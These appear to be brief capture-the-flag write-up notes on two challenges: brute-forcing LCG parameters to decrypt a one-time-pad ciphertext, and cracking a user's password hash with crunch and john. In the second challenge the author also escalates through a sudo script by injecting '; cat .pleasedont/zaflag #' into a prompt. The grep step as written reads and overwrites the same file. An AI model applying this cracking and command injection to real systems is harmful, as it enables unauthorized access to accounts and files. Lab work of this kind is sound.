1) lcg-otp:
    - Wrote a rust program for finding the decrypting the ciphertext that I got
    from the server.
    - Performed a brute-force attack by iterating through possible LCG parameters (a, b).
    - Generated the keystream using each (a, b) pair.
    - XOR the keystream with the ciphertext to obtain the plaintext.
    - Searched in the decrypted text for the flag pattern.

2) unexpected-ceo:

    - Generated all possible password combinations:
    crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha-numeric -o all_passwords.txt
    grep '^[A-Z][a-z][0-9][0-9]$' passwords.txt > passwords.txt

    - Cracked the password for hr_sw337ie:
    john --format=crypt --wordlist=passwords.txt hash_copy.txt

    - Used the password to login as hr_sw337ie:
    su hr_sw337ie

    - After reading the message, I ran the script in the ceo's folder using
    sudo -u th3ceo ./generate_report.sh
    
    - When prompted, I escaped the echo command and provided another one
    ; ls -la #
    ; cat .pleasedont/zaflag #